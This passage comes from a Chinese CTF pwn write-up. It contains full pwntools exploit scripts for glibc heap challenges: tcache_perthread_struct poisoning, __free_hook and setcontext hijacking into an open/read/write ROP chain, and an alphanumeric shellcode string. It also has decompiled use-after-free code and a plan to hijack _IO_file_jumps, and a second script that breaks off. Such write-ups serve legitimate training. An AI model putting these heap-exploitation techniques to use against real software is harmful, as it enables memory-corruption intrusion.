title="三：劫持setcontext"></a>三：劫持setcontext</h2><p>首先我们要先了解tcache_perthread_struct结构体，它上面先是大小，再是每个tcachebin的基址，如果大小是0，那么结构体上的每个tcache的地址就是下一次申请heap的地址（同时也是写的地址）</p><p>因此我们构造两个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw1=heap_base+<span class="number">0x3000</span></span><br><span class="line">orw2=heap_base+<span class="number">0x3060</span></span><br><span class="line">stack1=heap_base+<span class="number">0x2000</span></span><br><span class="line">stack2=heap_base+<span class="number">0x20A0</span></span><br></pre></td></tr></table></figure><p>可以将orw上填充满orwshell的rop链，然后用stack1上的tcache来作为free的参数，stack2上便是orw的地址（要再加上一个ret，因为setcontext搞完mov之后便是ret）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./silverwolf&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28486</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 heap_base</span></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x11b0</span></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#step2 libc_base</span></span><br><span class="line">edit(p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000007000000</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">debug()</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3EBCA0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">debug()</span><br><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000000000000</span>))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment">#step3 SROP</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x215BF</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x43AE8</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x23EEA</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1B96</span></span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">syscall = libc_base + <span class="number">0xE5965</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span></span><br><span class="line">ret = libc_base + <span class="number">0x8AA</span></span><br><span class="line"></span><br><span class="line">orw1=heap_base+<span class="number">0x3000</span></span><br><span class="line">orw2=heap_base+<span class="number">0x3060</span></span><br><span class="line"></span><br><span class="line">stack1=heap_base+<span class="number">0x2000</span></span><br><span class="line">stack2=heap_base+<span class="number">0x20A0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(free_hook)  <span class="comment">#0x20</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)                      <span class="comment">#0x30</span></span><br><span class="line">payload+=p64(flag_addr)              <span class="comment">#0x40</span></span><br><span class="line">payload+=p64(stack1)                 <span class="comment">#0x50</span></span><br><span class="line">payload+=p64(stack2)                 <span class="comment">#0x60 </span></span><br><span class="line">payload+=p64(orw1)                   <span class="comment">#0x70</span></span><br><span class="line">payload+=p64(orw2)                   <span class="comment">#0x80</span></span><br><span class="line"></span><br><span class="line">edit(payload)</span><br><span class="line">debug()</span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(orw1)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(read)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(p64(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(orw[:<span class="number">0x60</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(orw[<span class="number">0x60</span>:])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">edit(p64(orw1)+p64(ret))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>这道题非常的妙，考察了tcache_perthread_struct结构体的利用和setcontext劫持利用（算是一个堆来控制栈的有效手段）</p><h1 id="SUCTF-2018-招新赛-unlink"><a href="#SUCTF-2018-招新赛-unlink" class="headerlink" title="[SUCTF 2018 招新赛]unlink"></a>[SUCTF 2018 招新赛]unlink</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258829.png" alt="image-20240516000224972"></p><p><strong>libc-2.23.so</strong></p><h1 id="CISCN-2022-华东北-duck"><a href="#CISCN-2022-华东北-duck" class="headerlink" title="[CISCN 2022 华东北]duck"></a>[CISCN 2022 华东北]duck</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258830.png" alt="image-20240516122104471"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep <span class="string">&#x27;GLIBC&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258831.png" alt="image-20240516122335908" style="zoom:50%;" /><p>估摸是2.34</p><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ini();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(a1, a2);</span><br><span class="line">      v3 = read_1();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是一个菜单堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )                   <span class="comment">// max=20</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      qword_4060[i] = v2;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Empty!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)qword_4060[v1]);               <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_4060[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_147A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = read_1();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      similar_read(qword_4060[v1], v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>发现只有一个uaf，因此要打劫持io流（不然没有程序ret点</p><p>也可以通过environ来打rop</p><p>这里通过劫持<code>_IO_file_jumps</code>的<code>_IO_new_file_overflow</code>来打的</p><p>因为puts函数的时候会调用这个函数，因此直接坐等flag</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258832.png" alt="image-20240516222354249"></p><p>对puts的栈回溯是这样的</p><p>在此之前要先泄露libc基址和heap基址（来加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        